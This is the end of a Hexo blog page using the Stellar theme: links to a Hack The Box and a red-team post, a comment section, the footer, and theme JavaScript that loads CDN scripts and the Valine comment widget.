+<div class="related-wrap reveal" id="read-next"><section class="header cap theme"><span>READ NEXT</span></section><section class="body fs14"><a id="next" href="/post/90c7e1bd/">HTB: Lame<span class="note">Older</span></a><div class="line"></div><a id="prev" href="/post/87eb37a9/">红队实战之Cc123<span class="note">Newer</span></a></section></div>
+
+
+
+
+
+
+  <div class='related-wrap md reveal' id="comments">
+    <div class='cmt-title cap theme'>
+      Join the discussion
+    </div>
+    <div class='cmt-body valine'>
+      
+
+<div id="valine_container" class="valine_thread"><svg class="loading" style="vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
+
+    </div>
+  </div>
+
+
+
+      
+<footer class="page-footer reveal fs12"><hr><div class="text"><p>All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</p>
+<p>This site was deployed by <a href="https://toxic80l.github.io/">@toxic80L</a> using <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1" title="v1.6.1">Stellar</a>.</p>
+</div></footer>
+
+      <div class='float-panel mobile-only blur' style='display:none'>
+  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
+    <svg class="icon" style="width: 1em; height: 1em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="15301"><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 2.3 26.8 24.6 47.5 51.6 47.6h416.5v4z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15302"></path><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 1.9 27.7 23.9 49.7 51.6 51.6h416.5z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15303"></path></svg>
+  </button>
+</div>
+
+    </div>
+  </div>
+  <div class='scripts'>
+    <script type="text/javascript">
+  stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1';
+  stellar.config = {
+    date_suffix: {
+      just: 'Just',
+      min: 'minutes ago',
+      hour: 'hours ago',
+      day: 'days ago',
+      month: 'months ago',
+    },
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js',
+    sitesjs: '/js/plugins/sites.js',
+    friendsjs: '/js/plugins/friends.js',
+  };
+
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.3.1/dist/lazyload.min.js","transition":"blur"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@6/swiper-bundle.min.css","js":"https://unpkg.com/swiper@6/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://cdn.jsdelivr.net/npm/scrollreveal@4.0.9/dist/scrollreveal.min.js","distance":"8px","duration":500,"interval":100,"scale":1});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","instant_page":"https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@4.1.2/js/instant_page.js","flying_pages":"https://cdn.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"});
+  }
+</script>
+
+<!-- required -->
+
+  
+<script src="/js/main.js" async></script>
+
+
+
+<!-- optional -->
+
+  <script>
+  function getEmojiMaps() {
+    function emoji(path, idx, ext) {
+      return path + "/" + path + "-" + idx + "." + ext;
+    }
+    var emojiMaps = {};
+    for (var i = 1; i <= 54; i++) {
+      emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+    }
+    for (var i = 1; i <= 101; i++) {
+      emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+    }
+    for (var i = 1; i <= 116; i++) {
+      emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+    }
+    for (var i = 1; i <= 125; i++) {
+      emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+    }
+    for (var i = 1; i <= 4; i++) {
+      emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+    }
+    return emojiMaps;
+  }
+  function load_comment(){
+    if(!document.getElementById("valine_container"))return;
+    stellar.loadScript('https://cdn.jsdelivr.net/gh/XuxuGood/simple-blog-cdn@main/js/Valine.min.js', {defer:true}).then(function () {
+      const el = document.getElementById("valine_container");
+      var path = el.getAttribute('comment_id');
+      const placeholder = "";
+      if (!path) {
+        path = decodeURI(window.location.pathname);
+      }
+      var valine = new Valine();
+      valine.init(Object.assign({"js":"https://cdn.jsdelivr.net/gh/XuxuGood/simple-blog-cdn@main/js/Valine.min.js","appId":"5eo9cV9bsvMnta4gOnhxtdKF-gzGzoHsz","appKey":"LwEPyca9biyGVsDzHA7WfAjH","placeholder":null,"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false,"tagMeta":["博主","小伙伴","访客"],"metaPlaceholder":{"nick":"昵称/QQ号(必填)","mail":"邮箱（必填，完全保密）","link":"网址(https://)"},"master":["6783037F2DF30EAB99F9FC256157D875"],"friends":["6783037F2DF30EAB99F9FC256157D875"]}, {
+        el: '#valine_container',
+        path: path,
+        placeholder: placeholder,
+        emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
+        emojiMaps: getEmojiMaps(),
+      }));
+    });
+  }
+  window.addEventListener('DOMContentLoaded', (event) => {
+    console.log('DOM fully loaded and parsed');
+    load_comment();
+  });
+
+</script>
+
+
+
+
+<!-- inject -->
+
+
+  </div>
+</body>
+</html>
